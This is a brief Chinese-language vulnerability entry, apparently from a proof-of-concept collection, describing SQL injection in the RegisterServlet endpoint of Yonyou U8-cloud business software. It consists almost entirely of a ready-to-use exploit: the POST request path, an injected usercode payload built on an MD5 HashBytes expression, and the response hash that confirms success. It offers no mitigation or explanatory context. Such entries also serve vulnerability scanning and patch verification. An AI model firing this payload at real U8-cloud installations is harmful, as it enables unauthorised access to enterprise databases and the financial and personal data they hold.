# 用友u8-cloudRegisterServletSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **请求**：`POST /servlet/RegisterServlet HTTP/1.1`

**Payload**
```
usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--
```
- **响应特征**：200 e10adc3949ba59abbe56e057f20f883e